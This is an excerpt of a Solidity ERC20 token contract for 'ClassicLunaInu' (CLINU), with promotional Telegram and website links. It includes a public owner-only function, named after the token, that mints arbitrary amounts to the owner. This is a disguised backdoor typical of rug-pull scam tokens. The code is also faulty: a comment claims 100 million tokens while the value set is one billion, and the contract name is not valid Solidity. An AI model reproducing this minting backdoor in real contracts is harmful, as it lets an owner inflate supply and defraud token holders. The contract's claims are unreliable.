...
//
// $ClassicLunaInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ClassicLunalnu
// 🌐 Website:https://classiclunainu.live/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ClassicLunaInu(uint256 amount) public onlyOwner {
 _ClassicLunaInu(msg.sender, amount);
    }
    ...
    function _ClassicLunaInu(address account, uint256 amount) internal virtual {
...
contract $ClassicLunaInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ClassicLunaInu", "CLINU") {
     _ClassicLunaInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}